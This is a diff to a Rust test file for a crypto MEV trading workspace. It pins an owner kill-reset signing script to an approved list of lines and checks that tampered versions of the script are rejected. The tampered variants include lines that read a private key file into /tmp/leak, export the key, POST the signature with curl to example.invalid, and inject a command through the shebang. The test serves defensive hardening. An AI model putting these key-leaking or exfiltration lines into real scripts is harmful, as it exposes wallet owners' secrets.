@@ -173,6 +173,100 @@ fn dependency_features() -> BTreeMap<&'static str, (&'static [&'static str], boo
     ])
 }
 
+const OWNER_SCRIPT_EXECUTABLE_LINES: &[&str] = &[
+    "set -euo pipefail",
+    r#"export PATH="$HOME/.foundry/bin:$PATH""#,
+    r#"if [ "$#" -ne 2 ]; then"#,
+    r#"echo "usage: $0 <engagement_epoch> <nonce>" >&2"#,
+    "exit 2",
+    "fi",
+    r#"EPOCH="$1""#,
+    r#"NONCE="$2""#,
+    r#"if ! [[ "$EPOCH" =~ ^[0-9]+$ && "$NONCE" =~ ^[0-9]+$ ]]; then"#,
+    r#"echo "engagement_epoch and nonce must be unsigned decimal integers" >&2"#,
+    "exit 2",
+    "fi",
+    r#"ROOT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/.." && pwd)""#,
+    r#"RESET_CONTEXT="$("#,
+    "cargo run --quiet --manifest-path \"$ROOT_DIR/Cargo.toml\" \\",
+    r#"-p base-kill-reset-bin -- --prepare "$EPOCH" "$NONCE""#,
+    r#")""#,
+    r#"mapfile -t RESET_LINES <<< "$RESET_CONTEXT""#,
+    r#"if [ "${#RESET_LINES[@]}" -ne 2 ]; then"#,
+    r#"echo "kill-reset binary returned an invalid preparation response" >&2"#,
+    "exit 1",
+    "fi",
+    r#"MSG="${RESET_LINES[0]}""#,
+    r#"EXPECT_ADDR="${RESET_LINES[1]}""#,
+    r#"echo "  message: $MSG""#,
+    r#"echo "== [1/3] derive and compare owner address ==""#,
+    r#"GOT_ADDR="$(cast wallet address --interactive)""#,
+    r#"echo "  derived: $GOT_ADDR""#,
+    r#"echo "  expect : $EXPECT_ADDR""#,
+    r#"if [ "${GOT_ADDR,,}" != "${EXPECT_ADDR,,}" ]; then"#,
+    r#"echo "  owner address mismatch; aborting" >&2"#,
+    "exit 1",
+    "fi",
+    r#"echo "== [2/3] sign ==""#,
+    r#"SIG="$(cast wallet sign --interactive "$MSG")""#,
+    r#"echo "== [3/3] verify ==""#,
+    r#"cast wallet verify --address "$EXPECT_ADDR" "$MSG" "$SIG""#,
+    r#"SIG_HEX="${SIG#0x}""#,
+    r#"if ! [[ "$SIG_HEX" =~ ^[0-9a-f]{130}$ ]]; then"#,
+    r#"echo "cast returned a non-canonical signature; aborting" >&2"#,
+    "exit 1",
+    "fi",
+    r#"echo """#,
+    r#"echo "================ KILL-RESET SIGNATURE ================""#,
+    r#"echo "$SIG_HEX""#,
+    r#"echo "======================================================""#,
+];
+
+fn validate_owner_script_program(script: &str) -> Result<(), String> {
+    if !script.starts_with("#!/usr/bin/env bash\n") {
+        return Err("owner script interpreter line changed".to_owned());
+    }
+    let executable_lines = script
+        .lines()
+        .enumerate()
+        .filter_map(|(line_index, line)| {
+            let line = line.trim();
+            (!line.is_empty() && !line.starts_with('#')).then_some((line_index + 1, line))
+        })
+        .collect::<Vec<_>>();
+
+    if executable_lines.len() != OWNER_SCRIPT_EXECUTABLE_LINES.len() {
+        return Err(format!(
+            "owner script executable-line count changed: expected {}, got {}",
+            OWNER_SCRIPT_EXECUTABLE_LINES.len(),
+            executable_lines.len()
+        ));
+    }
+
+    for ((line_number, actual), expected) in
+        executable_lines.iter().zip(OWNER_SCRIPT_EXECUTABLE_LINES)
+    {
+        if actual != expected {
+            return Err(format!(
+                "unclassified owner-script line {line_number}: expected {expected:?}, got {actual:?}"
+            ));
+        }
+    }
+    Ok(())
+}
+
+fn replace_once(source: &str, from: &str, to: &str) -> String {
+    assert_eq!(source.matches(from).count(), 1, "mutant source must have one match");
+    source.replacen(from, to, 1)
+}
+
+fn assert_owner_script_mutant_red(name: &str, mutant: &str) {
+    match validate_owner_script_program(mutant) {
+        Ok(()) => panic!("{name} unexpectedly green"),
+        Err(error) => eprintln!("{name}: RED ({error})"),
+    }
+}
+
 #[test]
 fn metadata_has_exact_target_and_dependency_shape() {
     let metadata = metadata();
@@ -243,6 +337,152 @@ fn metadata_has_exact_target_and_dependency_shape() {
             "forbidden direct dependency {name}"
         );
     }
+}
+
+#[test]
+fn every_workspace_binary_linking_trader_is_dependency_and_source_sealed() {
+    let metadata = metadata();
+    let packages = metadata["packages"].as_array().expect("packages");
+    let mut linked_binary_count = 0;
+
+    for package in packages {
+        let targets = package["targets"].as_array().expect("targets");
+        let binary_targets: Vec<_> = targets
+            .iter()
+            .filter(|target| {
+                target["kind"].as_array().expect("target kind").iter().any(|kind| kind == "bin")
+            })
+            .collect();
+        if binary_targets.is_empty() {
+            continue;
+        }
+
+        let dependencies = package["dependencies"].as_array().expect("dependencies");
+        let trader_dependency = dependencies.iter().find(|dependency| {
+            dependency["kind"].is_null() && dependency["name"].as_str() == Some("base-mev-trader")
+        });
+        let links_trader = trader_dependency.is_some();
+        if !links_trader {
+            continue;
+        }
+        linked_binary_count += 1;
+
+        let dependency_names: BTreeSet<_> = dependencies
+            .iter()
+            .map(|dependency| dependency["name"].as_str().expect("dependency name"))
+            .collect();
+        assert_eq!(
+            dependency_names,
+            BTreeSet::from(["base-mev-trader"]),
+            "binary package {} linking the trader must remain capability-minimal",
+            package["name"]
+        );
+        assert!(
+            dependencies.iter().all(|dependency| dependency["kind"].is_null()),
+            "binary package {} linking the trader cannot add dev or build dependencies",
+            package["name"]
+        );
+        let trader_dependency = trader_dependency.expect("trader dependency");
+        assert!(
+            trader_dependency["features"].as_array().expect("trader features").is_empty(),
+            "trader-linked binary cannot enable capability features"
+        );
+        assert_eq!(trader_dependency["uses_default_features"], true);
+        assert_eq!(trader_dependency["optional"], false);
+        assert!(trader_dependency["rename"].is_null());
+        assert!(trader_dependency["target"].is_null());
+
+        for target in binary_targets {
+            let source_path = target["src_path"].as_str().expect("binary source path");
+            let source = fs::read_to_string(source_path).expect("binary source");
+            let found = identifiers(&source)
+                .unwrap_or_else(|error| panic!("malformed binary source {source_path}: {error}"));
+            for forbidden in FORBIDDEN_IDENTIFIERS {
+                assert!(
+                    !found.contains(forbidden),
+                    "forbidden identifier {forbidden} in trader-linked binary {source_path}"
+                );
+            }
+        }
+    }
+
+    assert!(linked_binary_count > 0, "seal must cover at least one trader-linked binary");
+}
+
+#[test]
+fn owner_kill_reset_script_is_fail_closed_with_m1_through_m6_mutants() {
+    let script = fs::read_to_string(workspace_root().join("scripts/owner-kill-reset-sign.sh"))
+        .expect("owner kill-reset script");
+    validate_owner_script_program(&script).expect("reviewed owner-script program");
+
+    let prepare_block = r#"ROOT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/.." && pwd)"
+RESET_CONTEXT="$(
+  cargo run --quiet --manifest-path "$ROOT_DIR/Cargo.toml" \
+    -p base-kill-reset-bin -- --prepare "$EPOCH" "$NONCE"
+)"
+mapfile -t RESET_LINES <<< "$RESET_CONTEXT"
+if [ "${#RESET_LINES[@]}" -ne 2 ]; then
+  echo "kill-reset binary returned an invalid preparation response" >&2
+  exit 1
+fi
+MSG="${RESET_LINES[0]}"
+EXPECT_ADDR="${RESET_LINES[1]}"
+echo "  message: $MSG""#;
+    let m1 = replace_once(
+        &script,
+        prepare_block,
+        r#"MSG="base-mev:p2-killreset:$EPOCH:$NONCE"
+EXPECT_ADDR="0x581F5c5EC1d63BA08d6024E8b1cF88b83D57285b""#,
+    );
+    assert!(!m1.contains("base-kill-reset-bin"), "M1 instrument did not remove binary source");
+    assert_owner_script_mutant_red("M1", &m1);
+
+    let m2 = replace_once(
+        &script,
+        r#"echo "  message: $MSG""#,
+        r#"KEYMAT="$(cat "$HOME/.config/mev-owner-attest/attest.key")"
+printf '%s\n' "$KEYMAT" > /tmp/leak
+echo "  message: $MSG""#,
+    );
+    assert_owner_script_mutant_red("M2", &m2);
+
+    let m3 = replace_once(
+        &script,
+        r#"GOT_ADDR="$(cast wallet address --interactive)""#,
+        r#"export ETH_PRIVATE_KEY="$(cat "$HOME/.config/mev-owner-attest/attest.key")"
+GOT_ADDR="$(cast wallet address --interactive)""#,
+    );
+    assert_owner_script_mutant_red("M3", &m3);
+
+    let m4 = replace_once(
+        &script,
+        r#"SIG_HEX="${SIG#0x}""#,
+        r#"SIG_HEX="${SIG#0x}"
+curl -X POST -d "$SIG_HEX" https://example.invalid/collect"#,
+    );
+    assert_owner_script_mutant_red("M4", &m4);
+
+    let m5 =
+        replace_once(&script, "cast wallet address --interactive", "cast wallet address \"$K\"");
+    assert_owner_script_mutant_red("M5", &m5);
+
+    let address_gate = r#"echo "== [1/3] derive and compare owner address =="
+GOT_ADDR="$(cast wallet address --interactive)"
+echo "  derived: $GOT_ADDR"
+echo "  expect : $EXPECT_ADDR"
+if [ "${GOT_ADDR,,}" != "${EXPECT_ADDR,,}" ]; then
+  echo "  owner address mismatch; aborting" >&2
+  exit 1
+fi"#;
+    let m6 = replace_once(&script, address_gate, "");
+    assert_owner_script_mutant_red("M6", &m6);
+
+    let n7 = replace_once(
+        &script,
+        "#!/usr/bin/env bash",
+        "#!/usr/bin/env -S bash -c 'id > /tmp/pr47-shebang' --",
+    );
+    assert_owner_script_mutant_red("N7", &n7);
 }
 
 #[test]
